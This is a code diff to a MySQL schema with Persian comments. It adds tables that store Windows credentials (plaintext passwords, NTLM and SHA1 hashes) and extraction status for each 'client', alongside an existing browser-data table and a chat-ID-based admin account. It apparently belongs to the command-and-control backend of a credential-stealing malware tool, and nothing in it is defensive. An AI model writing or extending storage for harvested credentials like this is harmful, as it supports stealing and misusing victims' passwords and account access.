@@ -155,6 +155,42 @@ CREATE TABLE IF NOT EXISTS browser_data_comprehensive (
     INDEX idx_collected_at (collected_at)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
 
+-- جدول credential های ویندوز
+CREATE TABLE IF NOT EXISTS client_windows_credentials (
+    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    client_id VARCHAR(32) NOT NULL,
+    username VARCHAR(255),
+    domain VARCHAR(255),
+    password TEXT,
+    ntlm_hash VARCHAR(65),
+    sha1_hash VARCHAR(40),
+    credential_type VARCHAR(50) DEFAULT 'msv',
+    source VARCHAR(100),
+    extracted_at DATETIME,
+    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
+    INDEX idx_client_id (client_id),
+    INDEX idx_username (username),
+    INDEX idx_credential_type (credential_type),
+    INDEX idx_created_at (created_at)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
+-- جدول وضعیت استخراج credential
+CREATE TABLE IF NOT EXISTS client_credential_status (
+    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    client_id VARCHAR(32) NOT NULL,
+    status ENUM('success', 'error', 'partial') DEFAULT 'success',
+    credentials_found INT DEFAULT 0,
+    hashes_found INT DEFAULT 0,
+    passwords_found INT DEFAULT 0,
+    message TEXT,
+    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
+    INDEX idx_client_id (client_id),
+    INDEX idx_status (status),
+    INDEX idx_created_at (created_at)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
 -- درج کاربر ادمین پیش‌فرض
 -- توجه: این را با ADMIN_CHAT_ID واقعی خود جایگزین کنید
 INSERT INTO users (user_id, is_active, is_admin, created_at)
